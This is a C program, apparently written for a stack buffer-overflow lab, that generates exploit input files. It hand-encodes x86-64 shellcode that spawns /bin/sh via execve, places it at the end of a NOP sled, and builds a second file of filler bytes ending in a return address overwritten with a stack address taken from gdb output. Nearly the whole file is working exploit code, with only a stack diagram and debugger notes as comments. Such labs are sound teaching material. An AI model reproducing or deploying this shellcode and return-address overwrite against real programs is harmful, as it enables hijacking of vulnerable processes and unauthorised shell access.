#include <stdio.h>



/*
  stack:
  ------------------

                 +--------------------+
                 |                    |
                 +--------------------+
                 |                    |
                 |      main asm      |
                 |                    |
                 +--------------------+
                 |                    |  function1
                 |        NOP         |
                 |                    |
                 +--------------------+
  0x7fffffffe440 |    buffer start    |
                 +--------------------+
                 +--------------------+
                 |        RT          |
                 +--------------------+
                 |  Previous Frame    |
                 +--------------------+
                 |                    |
                 |                    |
                 |                    |  function2
                 |                    |
                 |                    |
                 +--------------------+
                 |    buffer start    |
                 +--------------------+

*/  

int asm1(char * code)
{
    int idx = 0;
    // opcode directly hexdump theke neoa
    code[idx++]= 0xb8;  code[idx++] = 0x2f;
    code[idx++]= 0x73;  code[idx++] = 0x68;
    code[idx++]= 0xff;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe0;
    code[idx++]= 0x28;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe8;
    code[idx++]= 0x08;  code[idx++] = 0x48;
    code[idx++]= 0x0d;  code[idx++] = 0x2f;
    code[idx++]= 0x62;  code[idx++] = 0x69;
    code[idx++]= 0x6e;  code[idx++] = 0x50;
    code[idx++]= 0x48;  code[idx++] = 0x89;
    code[idx++]= 0xe7;  code[idx++] = 0x48;
    code[idx++]= 0x31;  code[idx++] = 0xc0;
    code[idx++]= 0x50;  code[idx++] = 0x57;
    code[idx++]= 0x48;  code[idx++] = 0x89;
    code[idx++]= 0xe6;  code[idx++] = 0x48;
    code[idx++]= 0x31;  code[idx++] = 0xd2;
    code[idx++]= 0xb8;  code[idx++] = 0x3b;
    code[idx++]= 0xff;  code[idx++] = 0xff;
    code[idx++]= 0xff;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe0;
    code[idx++]= 0x38;  code[idx++] = 0x48;
    code[idx++]= 0xc1;  code[idx++] = 0xe8;
    code[idx++]= 0x38;  code[idx++] = 0x0f;
    code[idx++]= 0x05;
    return idx;
    
}

int main()
{
    FILE* badfile_fp = fopen("badfile.txt", "w");
    FILE* asm_fp = fopen("asm-1.txt", "w");

    // asm
    char code[1000];
    int len = asm1(code);
    printf("code len = %d\n", len);

    char file1[1000];
    int idx = 0;

    // fill with nop
    for(int i=0; i<300; i++)
	file1[i] = 0x90;

    // put asm
    int j = 0;
    idx = 300 - len;
    while(j < len)
	file1[idx++] = code[j++];

    // null
    file1[300] = 0;
    fwrite(file1, sizeof(char), 300, asm_fp);






    // gdb theke
    // ==========================
    // 
    // function1():
    // -----------------
    // %rbp    : 0x7fffffffe4b0
    // &buffer : 0x7fffffffe380
    // %rsp    : 0x7fffffffe370
    // -----------------
    //
    // function2():
    // -----------------
    // %rbp : 0x7fffffffe360
    // &buffer : 0x7fffffffe2f0
    // %rsp : 0x7fffffffe2e0
    // -----------------


    unsigned long int rt = 0x7fffffffe380 + 256;
    char file2[1000];
    for(int i=0; i<120; i++) file2[i] = 0xff;
    idx = 120;
    // return address
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff; rt = rt >> ((unsigned long int)8);
    file2[idx++] = rt & 0xff;


    fwrite(file2, sizeof(char), idx, badfile_fp);

    fclose(asm_fp);
    fclose(badfile_fp);
    return 0;
}
